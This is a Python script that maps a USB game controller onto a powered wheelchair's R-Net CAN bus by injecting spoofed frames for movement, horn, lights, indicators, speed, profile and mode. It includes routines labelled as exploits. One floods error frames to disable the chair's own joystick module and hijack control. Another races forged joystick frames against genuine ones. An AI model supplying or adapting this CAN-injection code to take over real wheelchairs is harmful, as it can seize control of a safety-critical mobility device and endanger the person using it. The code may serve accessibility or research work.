#!/python3

import socket, sys, os, array, threading
from time import *
from fcntl import ioctl
from can2RNET import *

#JoyLocal.py - Translate USB joystick x/y axis to Rnet and inject onto canbus
class X360:
	xthreshold = 8 * 0x10000 / 128
	ythreshold = 8 * 0x10000 / 128
	numProfiles = 5
	numModes = 4
	def init_joystick(self, device_path):
		print('Opening %s...' % device_path)
		return open(device_path, 'rb') # Open the joystick device.
	def usb_joystick_read_thread(self, jsdev):
		global joystick_x
		global joystick_y
		global rnet_threads_running
		speed_range = 0
		profile = 0
		mode = 0
		while rnet_threads_running:
#			try:
				evbuf = jsdev.read(8)
				jtime, jvalue, jtype, jnumber = struct.unpack('IhBB', evbuf)
				if jtype & 0x02:
					if (jnumber == 0):
						if abs(jvalue) > self.xthreshold:
							joystick_x = 0x100 + int(jvalue * 100 / 128) >> 8 &0xFF
						else:
							joystick_x = 0
					elif (jnumber == 1):
						if abs(jvalue) > self.ythreshold:
							joystick_y = 0x100 - int(jvalue * 100 / 128) >> 8 &0xFF
						else:
							joystick_y = 0
				elif jtype & 0x01:
					if jnumber == 0:
						RNETsetHorn(jvalue == 1)
					elif jnumber == 1:
						if jvalue == 1:
							RNETtoggleLights()
					elif jnumber == 2:
						if jvalue == 1 and speed_range>0:
							speed_range -= 25
							print("SpeedRange: " + str(speed_range))
							RNETsetSpeedRange(speed_range)
					elif jnumber == 3:
						if jvalue == 1 and speed_range<100:
							speed_range += 25
							print("SpeedRange: " + str(speed_range))
							RNETsetSpeedRange(speed_range)
					elif jnumber == 4:
						if jvalue == 1:
							RNETtoggleLeftIndicator()
					elif jnumber == 5:
						if jvalue == 1:
							RNETtoggleHazardsIndicator()
					elif jnumber == 6:
						if jvalue == 1:
							RNETtoggleRightIndicator()
					elif jnumber == 7:
						if jvalue == 1:
							pass #unused
					elif jnumber == 8:
						if jvalue == 1:
							profile=(profile+1)%self.numProfiles
							print('Profile ' + str(profile))
							RNETsetProfile(profile)
					elif jnumber == 9:
						if jvalue == 1:
							prev_mode = mode
							mode=(mode+1)%self.numModes
							print('Mode ' + str(prev_mode) + ' -> ' + str(mode))
							RNETsetMode(prev_mode, mode)
					elif jnumber == 10:
						if jvalue == 1:
							pass #unused
					elif jnumber == 11:
						if jvalue == 1:
							pass #unused
					else:
						print("NUM: "+str(jnumber)+"        VAL: "+str(jvalue))
#			except:
#				print("Error reading USB: joystick")
#				joystick_x = 0
#				joystick_y = 0
#				rnet_threads_running = False

def dec2hex(dec,hexlen):  #convert dec to hex with leading 0s and no '0x'
	h=hex(int(dec))[2:]
	l=len(h)
	if h[l-1]=="L":
		l-=1  #strip the 'L' that python int sticks on
	if h[l-2]=="x":
		h= '0'+hex(int(dec))[1:]
	return ('0'*hexlen+h)[l:l+hexlen]

#Set speed_range: 0% - 100%
def RNETsetSpeedRange(speed_range):
	global can_socket
	if speed_range>=0 and speed_range<=0x64:
		cansend(can_socket,'0A040100#'+dec2hex(speed_range,2))
	else:
		print('Invalid RNET SpeedRange: ' + str(speed_range))

def RNETsetHorn(horn_on):
	global can_socket
	cansend(can_socket,"0C040100#" if horn_on else "0C040101#")

def RNETtoggleLights():
	global can_socket
	cansend(can_socket, "0C000404#")

def RNETtoggleLeftIndicator():
	global can_socket
	cansend(can_socket, "0C000401#")

def RNETtoggleRightIndicator():
	global can_socket
	cansend(can_socket, "0C000402#")

def RNETtoggleHazardsIndicator():
	global can_socket
	cansend(can_socket, "0C000403#")

def RNETsetProfile(profile_num):
	global can_socket
	cansend(can_socket,"051#000"+dec2hex(profile_num,1)+"0000")

def RNETsetMode(prev_mode_num, new_mode_num):
	global can_socket
	cansend(can_socket,"061#400"+dec2hex(prev_mode_num,1)+"0000") #suspend previous mode
	sleep(0.1) #some delay required
	cansend(can_socket,"061#000"+dec2hex(new_mode_num,1)+"0000")

def induce_JSM_error():
	global can_socket
	for i in range(0,3):
		cansend(can_socket,'0c000000#')

def RNET_JSMerror_exploit():
	global can_socket
	print("Waiting for JSM heartbeat")
	canwait(can_socket,"03C30F0F:1FFFFFFF")
	t=time()+0.20
	print("Waiting for joy frame")
	joy_id = wait_rnet_joystick_frame(t)
	print("Using joy frame: "+joy_id)
	induce_JSM_error()
	print("3 x 0c000000# sent")
	return(joy_id)

#THREAD: sends RnetJoyFrame every mintime seconds
def send_joystick_canframe(joy_id):
	global can_socket
	mintime = .01
	nexttime = time() + mintime
	priorjoystick_x=joystick_x
	priorjoystick_y=joystick_y
	while rnet_threads_running:
		joyframe = joy_id+'#'+dec2hex(joystick_x,2)+dec2hex(joystick_y,2)
		cansend(can_socket,joyframe)
		nexttime += mintime
		t= time()
		if t < nexttime:
			sleep(nexttime - t)
		else:
			nexttime += mintime

#THREAD: Waits for joyframe and injects another spoofed frame ASAP
def inject_rnet_joystick_frame(rnet_joystick_id):
	global can_socket
	rnet_joystick_frame_raw = build_frame(rnet_joystick_id + "#0000") #prebuild the frame we are waiting on
	while rnet_threads_running:
		cf, addr = can_socket.recvfrom(16)
		if cf == rnet_joystick_frame_raw:
			cansend(can_socket, rnet_joystick_id + '#' + dec2hex(joystick_x, 2) + dec2hex(joystick_y, 2))

#Waits for any frame containing a Joystick position
#Returns: JoyFrame extendedID as text
def wait_rnet_joystick_frame(start_time):
	global can_socket
	frameid = ''
	while frameid[0:3] != '020':  #just look for joystick frame ID (no extended frame)
		cf, addr = can_socket.recvfrom(16) #this is a blocking read.... so if there is no canbus traffic it will sit forever (to fix!)
		candump_frame = dissect_frame(cf)
		frameid = candump_frame.split('#')[0]
		if time() > start_time:
			 print("JoyFrame wait timed out ")
			 return('Err!')
	return(frameid)

#do very little and output something as sign-of-life
def watch_and_wait():
	started_time = time()
	while threading.active_count() > 0 and rnet_threads_running:
		sleep(0.5)
		print(str(round(time()-started_time,2))+'\tX: '+dec2hex(joystick_x,2)+'\tY: '+dec2hex(joystick_y,2)+ '\tThreads: '+str(threading.active_count()))

#does not use a thread queue.  Instead just sets a global flag.
def kill_rnet_threads():
	global rnet_threads_running
	rnet_threads_running = False

# Makes sure that gamepad is centered.
def check_usb_gamepad_center():
	global joystick_x
	global joystick_y
	print('waiting for joystick to be centered')
	while (joystick_x !=0 or joystick_y !=0):
		print('joystick not centered')

def selectControlExploit():
	global can_socket
	user_selection = int(input("Select exploit to use: \n \n 1. Disable R-Net Joystick temporary. (Allows for better control) \n 2. Allow R-Net Joystick (Will see some lag, but is more safe.)\n"))
	print('Waiting for RNET-Joystick frame')
	rnet_joystick_id = wait_rnet_joystick_frame(time() + .20) #t=timeout time
	if rnet_joystick_id == 'Err!':
		print('No RNET-Joystick frame seen within minimum time')
		sys.exit()
	print('Found RNET-Joystick frame: ' + rnet_joystick_id)
	RNETsetSpeedRange(0) #set chair's speed to the lowest setting.
	if (user_selection == 1):
		rnet_joystick_id = RNET_JSMerror_exploit()
		sendjoyframethread = threading.Thread(
			target=send_joystick_canframe,
			args=(rnet_joystick_id,),
			daemon=True)
		sendjoyframethread.start()
	elif (user_selection == 2):
		inject_rnet_joystick_frame_thread = threading.Thread(
			target=inject_rnet_joystick_frame,
			args=(rnet_joystick_id,),
			daemon=True)
		inject_rnet_joystick_frame_thread.start()

if __name__ == "__main__":
	global rnet_threads_running
	global joystick_x
	global joystick_y
	global can_socket
	
	joystick_x = 0
	joystick_y = 0
	
	#init usb joystick
	joystick_path = '/dev/input/js0'
	x360 = X360()
	try:
		usb_joystick_dev = x360.init_joystick(joystick_path)
	except IOError:
		print ('No joystick at ' + joystick_path + ', exiting.')
		sys.exit()
	print('Using USB joystick @ ' + str(usb_joystick_dev).split("'")[1])
	
	rnet_threads_running = True
	can_socket = opencansocket(0)
	usb_joystick_read_thread = threading.Thread(
		target=x360.usb_joystick_read_thread,
		args=(usb_joystick_dev,),
		daemon=True)
	usb_joystick_read_thread.start()
	check_usb_gamepad_center()
	selectControlExploit()
	sleep(0.5)
	watch_and_wait()
	kill_rnet_threads()
	print("Exiting")
